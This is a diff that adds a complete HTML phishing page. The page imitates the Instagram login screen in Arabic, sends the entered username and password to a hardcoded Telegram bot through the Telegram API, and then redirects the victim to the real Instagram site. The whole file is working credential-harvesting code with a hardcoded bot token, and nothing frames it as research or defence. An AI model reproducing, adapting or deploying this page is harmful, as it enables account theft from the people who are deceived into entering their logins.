@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 7px; background: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+        img { width: 175px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="logo">
+    <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف">
+    <input type="password" id="pass" placeholder="كلمة السر">
+    <button onclick="send()">تسجيل الدخول</button>
+</div>
+<script>
+function send() {
+    const token = "8604267858:AAHZ2dBFT-LdMS_X5F6AF-6BakUi80iFtDA";
+    const chatId = "6018639900";
+    const u = document.getElementById("user").value;
+    const p = document.getElementById("pass").value;
+    const msg = `📸 صيد إنستجرام جديد! \n👤 User: ${u} \n🔑 Pass: ${p}`;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+    .then(() => { window.location.href = "https://instagram.com"; });
+}
+</script>
+</body>
+</html>
